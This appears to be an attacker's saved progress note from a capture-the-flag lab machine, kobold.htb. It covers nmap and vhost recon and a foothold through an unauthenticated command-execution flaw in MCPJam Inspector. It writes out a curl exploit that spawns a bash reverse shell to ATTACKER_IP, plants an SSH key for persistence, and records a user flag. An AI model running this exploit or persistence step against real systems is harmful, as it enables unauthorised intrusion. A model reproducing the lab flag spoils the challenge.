> Saved: 2026-03-21T21:20Z
> Target: 10.129.7.164
> Operation status: POST-ACCESS INVESTIGATION
> Current phase: Foothold obtained. Full post-access enumeration needed. Privesc not yet attempted.

## Where We Are Right Now
We have a stable SSH shell as **ben** (operator group) via planted SSH key. User flag captured. The next session should read the attack surface below, run a clean noire investigation, and build the privesc path from scratch. Do NOT re-run recon or re-exploit the foothold — it's solid.

## How We Got Here

### Recon
- Full nmap: 4 ports open (22, 80/443, 3552)
- Port 22: OpenSSH 9.6p1
- Port 80/443: nginx 1.24.0, redirects to https://kobold.htb
- Port 3552: Arcane Docker Management v1.13.0 (Go/SvelteKit)
- SSL cert: CN=kobold.htb, SAN includes wildcard *.kobold.htb
- Vhost fuzz discovered: **mcp.kobold.htb** (MCPJam Inspector) and **bin.kobold.htb** (PrivateBin — found later via nginx config)
- /etc/hosts entries added: kobold.htb, mcp.kobold.htb, bin.kobold.htb

### Foothold: MCPJam Inspector Stdio RCE
- **What:** https://mcp.kobold.htb hosts MCPJam Inspector, an MCP server testing tool
- **Vulnerability:** The `/api/mcp/connect` endpoint accepts stdio transport, which spawns arbitrary server-side commands. No authentication required.
- **Exploit:**
```bash
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{"serverConfig":{"type":"stdio","command":"bash","args":["-c","bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"],"env":{}},"serverId":"x"}'
```
- **Result:** Shell as `uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)`
- The MCP connection always reports failure (command isn't an MCP server) but the subprocess executes regardless.

### SSH Access Established
- Generated key: `ssh-keygen -t ed25519 -f /tmp/ben_key -N ""`
- Planted via MCPJam RCE: added pubkey to `/home/ben/.ssh/authorized_keys`
- SSH works: `ssh -i /tmp/ben_key ben@10.129.7.164`

### User Flag
- `f1057924705f1ae16e6b57d59b439aeb` at `/home/ben/user.txt`